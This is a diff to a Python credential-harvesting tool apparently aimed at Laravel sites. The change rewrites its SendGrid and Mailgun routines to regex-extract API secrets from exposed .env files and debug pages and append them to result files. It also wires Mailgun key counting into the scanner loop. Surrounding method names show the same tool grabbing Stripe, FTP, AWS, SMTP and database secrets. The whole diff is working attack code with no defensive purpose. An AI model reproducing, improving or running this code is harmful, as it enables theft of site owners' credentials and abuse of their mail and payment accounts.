@@ -1888,111 +1888,476 @@ class grabber:
         else:
             return False
     def get_sendgrid(self, method, urlku, teks):
-         if method == 'env':
-            if 'SENDGRID_API_KEY' in teks or 'SENDGRID_KEY' in teks or 'SENDGRID_APIKEY' in teks:
-             #method = '/.env'
-             try:
-                 acc_sid = reg('\nSENDGRID_API_KEY=(.*?)\n', teks)[0]
-             except:
+        objek = 0
+        if method == 'env':
+         try:  
+            if 'SENDGRID_SECRET' in teks:
+               #try:
                 try:
-                    acc_sid = reg('\nSENDGRID_KEY=(.*?)\n', teks)[0]
+                    key = re.findall('SENDGRID_SECRET=(.*?)\n', teks)[0]
+                    if '\r' in key:
+                        key = key.replace('\r', '')
+                    else:
+                        pass
+                    if key.startswith('"') and key.endswith('"'):
+                        key = key.replace('"', '')
+                    else:
+                        pass
+                    if key.startswith("'") and key.endswith("'"):
+                        key = key.replace("'",'')
+                    else:
+                        pass
+                    if " " in key:
+                        key = key.replace(' ', '')
+                    else:
+                     pass
+                    if key == 'null' or key == '' or key == '""' or "$_SERVER" in key:
+                        pass
+                    else:
+                        asu = str(key)
+                        with open('Result/sendgridkey.txt', 'a') as ppp:
+                            ppp.write(asu + '\n')
+                            # print(asu)
+                            objek += 1
                 except:
-                 try:
-                     acc_sid = reg('\nSENDGRID_APIKEY=(.*?)\n', teks)[0]
-                 except:
-                    acc_sid = ''
-             if acc_sid == 'null' or acc_sid == '' or '**' in acc_sid:
-                 return False
-             else:
-                    sendgr = str(acc_sid)
-                    ceker_sendgrid(urlku, sendgr)
-                    rever = str(sendgr).replace('\r', '')
-                    se = open('Result/sendg_key.txt', 'a')
-                    se.write(rever+'\n')
-                    se.close()
-                    return True
-            else:
-             return False
-         elif method == 'debug':
-            if 'SENDGRID_API_KEY' in teks or 'SENDGRID_KEY' in teks or 'SENDGRID_APIKEY' in teks:
-                #method = 'debug'
+                     pass
+            if 'SENDGRID_API_SECRET=' in teks:
+               #try:
                 try:
-                    acc_sid = reg('<td>SENDGRID_API_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
+                    key = re.findall('SENDGRID_API_SECRET=(.*?)\n', teks)[0]
+                    if '\r' in key:
+                        key = key.replace('\r', '')
+                    else:
+                        pass
+                    if key.startswith('"') and key.endswith('"'):
+                        key = key.replace('"', '')
+                    else:
+                        pass
+                    if key.startswith("'") and key.endswith("'"):
+                        key = key.replace("'",'')
+                    else:
+                        pass
+                    if " " in key:
+                        key = key.replace(' ', '')
+                    else:
+                        pass
+                    if key == 'null' or key == '' or key == '""' or "$_SERVER" in key:
+                        pass
+                    else:
+                        asu = str(key)
+                        with open('Result/sendgridkey.txt', 'a') as ppp:
+                            ppp.write(asu + '\n')
+                            # print(asu)
+                            objek += 1
                 except:
-                 try:
-                     acc_sid = reg('<td>SENDGRID_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
-                 except:
-                     try:
-                         acc_sid = reg('<td>SENDGRID_APIKEY<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
-                     except:
-                         acc_sid = ''
-                if acc_sid == 'null' or acc_sid == '' or '**' in acc_sid:
-                    return False
-                else:
-                    sendgr = str(acc_sid)
-                    ceker_sendgrid(urlku, sendgr)
-                    rever = str(sendgr).replace('\r', '')
-                    se = open('Result/sendg_key.txt', 'a')
-                    se.write(rever+'\n')
-                    se.close()
-                    return True
-            else:
+                     pass
+            if 'SENDGRID_API_KEY=' in teks:
+               #try:
+                try:
+                    key = re.findall('SENDGRID_API_KEY=(.*?)\n', teks)[0]
+                    if '\r' in key:
+                        key = key.replace('\r', '')
+                    else:
+                        pass
+                    if key.startswith('"') and key.endswith('"'):
+                        key = key.replace('"', '')
+                    else:
+                        pass
+                    if key.startswith("'") and key.endswith("'"):
+                        key = key.replace("'",'')
+                    else:
+                        pass
+                    if " " in key:
+                        key = key.replace(' ', '')
+                    else:
+                        pass
+                    if key == 'null' or key == '' or key == '""' or "$_SERVER" in key:
+                        pass
+                    else:
+                        asu = str(key)
+                        with open('Result/sendgridkey.txt', 'a') as ppp:
+                            ppp.write(asu + '\n')
+                            # print(asu)
+                            objek += 1
+                except:
+                     pass
+            if 'SENDGRID_APIKEY=' in teks:
+               #try:
+                try:
+                    key = re.findall('SENDGRID_APIKEY=(.*?)\n', teks)[0]
+                    if '\r' in key:
+                        key = key.replace('\r', '')
+                    else:
+                        pass
+                    if key.startswith('"') and key.endswith('"'):
+                        key = key.replace('"', '')
+                    else:
+                        pass
+                    if key.startswith("'") and key.endswith("'"):
+                        key = key.replace("'",'')
+                    else:
+                        pass
+                    if " " in key:
+                        key = key.replace(' ', '')
+                    else:
+                        pass
+                    if key == 'null' or key == '' or key == '""' or "$_SERVER" in key:
+                        pass
+                    else:
+                        asu = str(key)
+                        with open('Result/sendgridkey.txt', 'a') as ppp:
+                            ppp.write(asu + '\n')
+                            # print(asu)
+                            objek += 1
+                except:
+                     pass
+            if 'SENDGRID_KEY=' in teks:
+                try:
+                    key = re.findall('SENDGRID_KEY=(.*?)\n', teks)[0]
+                    if '\r' in key:
+                        key = key.replace('\r', '')
+                    else:
+                        pass
+                    if " " in key:
+                        key = key.replace(' ', '')
+                    else:
+                        pass
+                    if key == 'null' or key == '' or key == '""' or "$_SERVER" in key:
+                        pass
+                    else:
+                        asu = str(key)
+                        with open('Result/sendgridkey.txt', 'a') as ppp:
+                            ppp.write(asu + '\n')
+                            # print(asu)
+                            objek += 1
+                except:
+                     pass
+            if objek == 0:
                 return False
-         else:
-             return False
+            else:
+                return objek
+         except:
+                        pass
+        elif method == 'debug':
+         try:   
+            if 'SENDGRID_SECRET' in teks:
+                try:
+                    key = re.findall('<td>SENDGRID_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
+                    if '\r' in key:
+                        key = key.replace('\r', '')
+                    else:
+                        pass
+                    if ' ' in key:
+                        key = key.replace(' ', '')
+                    else:
+                        pass
+                    if key.startswith('"') and key.endswith('"'):
+                        key = key.replace('"', '')
+                    else:
+                        pass
+                    if key.startswith("'") and key.endswith("'"):
+                        key = key.replace("'",'')
+                    else:
+                        pass
+                    if key == 'null' or key == '' or key == '""' or "$_SERVER" in key:
+                        pass
+                    else:
+                        asu = str(key)
+                        with open('Result/sendgridkey.txt', 'a') as ppp:
+                            ppp.write(asu + '\n')
+                            # print(asu)
+                            objek += 1
+                except:
+                     pass
+            if "SENDGRID_API_SECRET" in teks:
+                try:
+                    key = re.findall('<td>SENDGRID_API_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
+                    if '\r' in key:
+                        key = key.replace('\r', '')
+                    if key == 'null' or key == '' or key == '""' or "$_SERVER" in key:
+                        pass
+                    else:
+                        asu = str(key)
+                        with open('Result/sendgridkey.txt', 'a') as ppp:
+                            ppp.write(asu + '\n')
+                            # print(asu)
+                            objek += 1
+                except:
+                     pass
+            if "SENDGRID_API_KEY" in teks:
+                try:
+                    key = re.findall('<td>SENDGRID_API_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
+                    if '\r' in key:
+                        key = key.replace('\r', '')
+                    if key == 'null' or key == '' or key == '""' or "$_SERVER" in key:
+                        pass
+                    else:
+                        asu = str(key)
+                        with open('Result/sendgridkey.txt', 'a') as ppp:
+                            ppp.write(asu + '\n')
+                            # print(asu)
+                            objek += 1
+                except:
+                    pass
+            if "SENDGRID_KEY" in teks:
+                try:
+                    key = re.findall('<td>SENDGRID_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
+                    if '\r' in key:
+                        key = key.replace('\r', '')
+                    if key == 'null' or key == '' or key == '""' or "$_SERVER" in key:
+                        pass
+                    else:
+                        asu = str(key)
+                        with open('Result/sendgridkey.txt', 'a') as ppp:
+                            ppp.write(asu + '\n')
+                            # print(asu)
+                            objek += 1
+                except:
+                    pass
+            if objek == 0:
+                return False
+            else:
+                return objek
+         except:
+          pass
+        else:
+            return False
 
     def get_mailgun(self, method, urlku, teks):
-     try:
-         if method == 'env':
-            if 'MAILGUN_API_KEY' in teks or 'MAILGUN_KEY' in teks or 'MAILGUN_APIKEY' in teks:
-             #method = '/.env'
-             try:
-                 acc_sid = reg('\nMAILGUN_API_KEY=(.*?)\n', teks)[0]
-             except:
+        objek = 0
+        if method == 'env':
+         try:  
+            if 'MAILGUN_SECRET' in teks:
+               #try:
                 try:
-                    acc_sid = reg('\nMAILGUN_KEY=(.*?)\n', teks)[0]
+                    key = re.findall('MAILGUN_SECRET=(.*?)\n', teks)[0]
+                    if '\r' in key:
+                        key = key.replace('\r', '')
+                    else:
+                        pass
+                    if key.startswith('"') and key.endswith('"'):
+                        key = key.replace('"', '')
+                    else:
+                        pass
+                    if key.startswith("'") and key.endswith("'"):
+                        key = key.replace("'",'')
+                    else:
+                        pass
+                    if " " in key:
+                        key = key.replace(' ', '')
+                    else:
+                     pass
+                    if key == 'null' or key == '' or key == '""' or "$_SERVER" in key:
+                        pass
+                    else:
+                        asu = str(key)
+                        with open('Result/mailgunkey.txt', 'a') as ppp:
+                            ppp.write(asu + '\n')
+                            # print(asu)
+                            objek += 1
                 except:
-                 try:
-                     acc_sid = reg('\nMAILGUN_APIKEY=(.*?)\n', teks)[0]
-                 except:
-                    try:
-                     acc_sid = reg('\nMAILGUN_SECRET=(.*?)\n', teks)[0]
-                    except:
-                        acc_sid = ' '
-            else:
-             return False
-         elif method == 'debug':
-            if 'MAILGUN_API_KEY' in teks or 'MAILGUN_KEY' in teks or 'MAILGUN_APIKEY' in teks or 'MAILGUN_SECRET' in teks:
-                #method = 'debug'
+                     pass
+            if 'MAILGUN_API_SECRET=' in teks:
+               #try:
                 try:
-                    acc_sid = reg('<td>MAILGUN_API_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
+                    key = re.findall('MAILGUN_API_SECRET=(.*?)\n', teks)[0]
+                    if '\r' in key:
+                        key = key.replace('\r', '')
+                    else:
+                        pass
+                    if key.startswith('"') and key.endswith('"'):
+                        key = key.replace('"', '')
+                    else:
+                        pass
+                    if key.startswith("'") and key.endswith("'"):
+                        key = key.replace("'",'')
+                    else:
+                        pass
+                    if " " in key:
+                        key = key.replace(' ', '')
+                    else:
+                        pass
+                    if key == 'null' or key == '' or key == '""' or "$_SERVER" in key:
+                        pass
+                    else:
+                        asu = str(key)
+                        with open('Result/mailgunkey.txt', 'a') as ppp:
+                            ppp.write(asu + '\n')
+                            # print(asu)
+                            objek += 1
                 except:
-                 try:
-                     acc_sid = reg('<td>MAILGUN_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
-                 except:
-                     try:
-                         acc_sid = reg('<td>MAILGUN_APIKEY<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
-                     except:
-                        try:
-                         acc_sid = reg('<td>MAILGUN_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
-                        except:
-                            acc_sid = ' '
-            else:
-             return False
-            if acc_sid == 'null' or acc_sid == '' or '*****' in acc_sid:
+                     pass
+            if 'MAILGUN_API_KEY=' in teks:
+               #try:
+                try:
+                    key = re.findall('MAILGUN_API_KEY=(.*?)\n', teks)[0]
+                    if '\r' in key:
+                        key = key.replace('\r', '')
+                    else:
+                        pass
+                    if key.startswith('"') and key.endswith('"'):
+                        key = key.replace('"', '')
+                    else:
+                        pass
+                    if key.startswith("'") and key.endswith("'"):
+                        key = key.replace("'",'')
+                    else:
+                        pass
+                    if " " in key:
+                        key = key.replace(' ', '')
+                    else:
+                        pass
+                    if key == 'null' or key == '' or key == '""' or "$_SERVER" in key:
+                        pass
+                    else:
+                        asu = str(key)
+                        with open('Result/mailgunkey.txt', 'a') as ppp:
+                            ppp.write(asu + '\n')
+                            # print(asu)
+                            objek += 1
+                except:
+                     pass
+            if 'MAILGUN_APIKEY=' in teks:
+               #try:
+                try:
+                    key = re.findall('MAILGUN_APIKEY=(.*?)\n', teks)[0]
+                    if '\r' in key:
+                        key = key.replace('\r', '')
+                    else:
+                        pass
+                    if key.startswith('"') and key.endswith('"'):
+                        key = key.replace('"', '')
+                    else:
+                        pass
+                    if key.startswith("'") and key.endswith("'"):
+                        key = key.replace("'",'')
+                    else:
+                        pass
+                    if " " in key:
+                        key = key.replace(' ', '')
+                    else:
+                        pass
+                    if key == 'null' or key == '' or key == '""' or "$_SERVER" in key:
+                        pass
+                    else:
+                        asu = str(key)
+                        with open('Result/mailgunkey.txt', 'a') as ppp:
+                            ppp.write(asu + '\n')
+                            # print(asu)
+                            objek += 1
+                except:
+                     pass
+            if 'MAILGUN_KEY=' in teks:
+                try:
+                    key = re.findall('MAILGUN_KEY=(.*?)\n', teks)[0]
+                    if '\r' in key:
+                        key = key.replace('\r', '')
+                    else:
+                        pass
+                    if " " in key:
+                        key = key.replace(' ', '')
+                    else:
+                        pass
+                    if key == 'null' or key == '' or key == '""' or "$_SERVER" in key:
+                        pass
+                    else:
+                        asu = str(key)
+                        with open('Result/mailgunkey.txt', 'a') as ppp:
+                            ppp.write(asu + '\n')
+                            # print(asu)
+                            objek += 1
+                except:
+                     pass
+            if objek == 0:
                 return False
             else:
-                sendgr = str(acc_sid)
-                rever = str(sendgr).replace('\r', '')
-                se = open('Result/mailgun_key.txt', 'a')
-                se.write(rever+'\n')
-                se.close()
-                return True
-         else:
-             return False
-     except:
-             return False
-    
+                return objek
+         except:
+            pass
+        elif method == 'debug':
+         try:   
+            if 'MAILGUN_SECRET' in teks:
+                try:
+                    key = re.findall('<td>MAILGUN_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
+                    if '\r' in key:
+                        key = key.replace('\r', '')
+                    else:
+                        pass
+                    if ' ' in key:
+                        key = key.replace(' ', '')
+                    else:
+                        pass
+                    if key.startswith('"') and key.endswith('"'):
+                        key = key.replace('"', '')
+                    else:
+                        pass
+                    if key.startswith("'") and key.endswith("'"):
+                        key = key.replace("'",'')
+                    else:
+                        pass
+                    if key == 'null' or key == '' or key == '""' or "$_SERVER" in key:
+                        pass
+                    else:
+                        asu = str(key)
+                        with open('Result/mailgunkey.txt', 'a') as ppp:
+                            ppp.write(asu + '\n')
+                            # print(asu)
+                            objek += 1
+                except:
+                     pass
+            if "MAILGUN_API_SECRET" in teks:
+                try:
+                    key = re.findall('<td>MAILGUN_API_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
+                    if '\r' in key:
+                        key = key.replace('\r', '')
+                    if key == 'null' or key == '' or key == '""' or "$_SERVER" in key:
+                        pass
+                    else:
+                        asu = str(key)
+                        with open('Result/mailgunkey.txt', 'a') as ppp:
+                            ppp.write(asu + '\n')
+                            # print(asu)
+                            objek += 1
+                except:
+                     pass
+            if "MAILGUN_API_KEY" in teks:
+                try:
+                    key = re.findall('<td>MAILGUN_API_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
+                    if '\r' in key:
+                        key = key.replace('\r', '')
+                    if key == 'null' or key == '' or key == '""' or "$_SERVER" in key:
+                        pass
+                    else:
+                        asu = str(key)
+                        with open('Result/mailgunkey.txt', 'a') as ppp:
+                            ppp.write(asu + '\n')
+                            # print(asu)
+                            objek += 1
+                except:
+                    pass
+            if "MAILGUN_KEY" in teks:
+                try:
+                    key = re.findall('<td>MAILGUN_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
+                    if '\r' in key:
+                        key = key.replace('\r', '')
+                    if key == 'null' or key == '' or key == '""' or "$_SERVER" in key:
+                        pass
+                    else:
+                        asu = str(key)
+                        with open('Result/mailgunkey.txt', 'a') as ppp:
+                            ppp.write(asu + '\n')
+                            # print(asu)
+                            objek += 1
+                except:
+                    pass
+            if objek == 0:
+                return False
+            else:
+                return objek
+         except:
+          pass
+        else:
+            return False
     def get_stripe(self, method, urlku, teks):
         if method == 'env':
             if 'STRIPE_KEY=' in teks:
@@ -2080,7 +2445,7 @@ class grabber:
                 return False
         else:
             return False
-
+    
     def get_ftp(self, method, urlku, teks):
         if method == 'env':
             if 'FTP_HOST=' in teks:
@@ -2820,6 +3185,8 @@ class laravel_grabber:
         self.bad = 0
         self.smtp = 0
         self.sendgrid = 0
+        self.sendgridcek = 0
+        self.mailguncek = 0
         self.database = 0
         self.nexmo = 0
         self.aws = 0
@@ -2847,10 +3214,14 @@ class laravel_grabber:
                 if smtp:
                     self.smtp += smtp
                     text += '[\033[92mSMTP\033[0m]'
-                sendgrid = grabber().get_sendgrid(tos['method'], tos['url'], tos['respon'])
-                if sendgrid:
-                    self.sendgrid += sendgrid
+                sendgridcek = grabber().get_sendgrid(tos['method'], tos['url'], tos['respon'])
+                if sendgridcek:
+                    self.sendgridcek += sendgridcek
                     text += '[\033[92mSENDGRID\033[0m]'
+                mailguncek = grabber().get_mailgun(tos['method'], tos['url'], tos['respon'])
+                if mailguncek:
+                    self.mailguncek += mailguncek
+                    text += '[\033[92mMAILGUN\033[0m]'
                 databes = grabber().get_database(tos['method'], tos['url'], tos['respon'])
                 if databes:
                     self.database += 1
